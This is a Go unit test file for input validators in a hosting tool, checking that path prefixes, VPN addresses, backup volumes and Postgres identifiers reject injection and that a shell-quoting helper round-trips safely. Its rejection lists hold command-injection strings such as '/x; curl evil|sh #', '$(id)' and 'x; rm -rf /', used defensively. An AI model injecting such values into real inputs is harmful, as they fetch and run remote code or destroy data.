// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 Arturo (AutoHost)

package handler

import (
	"os/exec"
	"testing"
)

func TestNormalizeFunnelPathPrefix(t *testing.T) {
	ok := map[string]string{"": "/", "/": "/", "app": "/app", "/app/": "/app", "/a/b-c_d.e~f": "/a/b-c_d.e~f", "/a/../b": "/b"}
	for in, want := range ok {
		got, err := normalizeFunnelPathPrefix(in)
		if err != nil || got != want {
			t.Errorf("normalizeFunnelPathPrefix(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"/x; curl evil|sh #", "/$(id)", "/`id`", "/a b", "/a'b", "/a\nb", "/a&b"} {
		if _, err := normalizeFunnelPathPrefix(bad); err == nil {
			t.Errorf("expected %q to be rejected", bad)
		}
	}
}

func TestNormalizeVPNAddress(t *testing.T) {
	for in, want := range map[string]string{"": "", "100.64.0.5": "100.64.0.5", " 100.64.0.5/32 ": "100.64.0.5/32", "fd7a:115c:a1e0::1": "fd7a:115c:a1e0::1"} {
		got, err := normalizeVPNAddress(in)
		if err != nil || got != want {
			t.Errorf("normalizeVPNAddress(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"1.2.3.4; reboot", "$(id)", "example.com", "1.2.3.4:80"} {
		if _, err := normalizeVPNAddress(bad); err == nil {
			t.Errorf("expected %q to be rejected", bad)
		}
	}
}

func TestValidateBackupVolume(t *testing.T) {
	for _, ok := range []string{"pgdata", "my_app-data.v1", "/srv/app/data"} {
		if err := validateBackupVolume(ok); err != nil {
			t.Errorf("expected %q to be valid: %v", ok, err)
		}
	}
	for _, bad := range []string{"/", "vol:/x", "vol,ro", "/srv/../etc", "/srv/app/", "../x", "", "a\nb"} {
		if err := validateBackupVolume(bad); err == nil {
			t.Errorf("expected %q to be rejected", bad)
		}
	}
}

func TestValidatePgIdentifierAPI(t *testing.T) {
	if err := validatePgIdentifier("user", "postgres"); err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"x; rm -rf /", "$(id)", "a b", ""} {
		if err := validatePgIdentifier("user", bad); err == nil {
			t.Errorf("expected %q to be rejected", bad)
		}
	}
}

func TestShellQuoteIsSingleWord(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("sh not available")
	}
	for _, in := range []string{"plain", "it's", "$(id)", "`id`", "a; echo pwned", `"quoted"`, "--set-path=/x'y"} {
		out, err := exec.Command(sh, "-c", "printf %s "+shellQuote(in)).Output()
		if err != nil {
			t.Fatalf("sh failed for %q: %v", in, err)
		}
		if string(out) != in {
			t.Errorf("shellQuote(%q) round-tripped to %q", in, out)
		}
	}
}
